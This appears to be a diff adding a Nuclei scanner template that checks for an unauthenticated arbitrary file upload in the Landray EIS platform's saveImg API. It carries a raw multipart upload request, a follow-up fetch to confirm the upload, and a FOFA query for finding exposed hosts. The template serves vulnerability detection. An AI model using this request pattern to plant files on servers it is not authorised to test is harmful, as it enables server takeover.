@@ -1,0 +1,54 @@
+id: landray-eis-saveimg-fileupload
+
+info:
+  name: 蓝凌eis智慧协同平台任意文件上传
+  author: fgz
+  severity: critical
+  tags: landray,fileupload
+  description: |
+    蓝凌eis智慧协同平台是由深圳市微达软件有限公司开发的用于企业在知识，协同，项目管理等场景的OA系统。其存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。
+  metadata:
+    max-request: 3
+    fofa-query: icon_hash="953405444"
+    hunter-query:
+    verified: true
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+  file_content: "{{to_lower(rand_text_alpha(26))}}"
+
+http:
+  - raw:
+      - |
+        POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu
+
+        ------WebKitFormBoundaryxdgaqmqu
+        Content-Disposition: form-data; name="file"filename="{{file_name}}"
+        Content-Type: text/html
+        
+        {{file_content}}
+        ------WebKitFormBoundaryxdgaqmqu--
+          
+      - |
+        GET {{file_name2}} HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    extractors:
+      - type: kval
+        name: file_name2
+        internal: true
+        kval:
+          - body
+    matchers:
+      - type: word
+        words:
+          - "{{file_content}}"
+        part: body
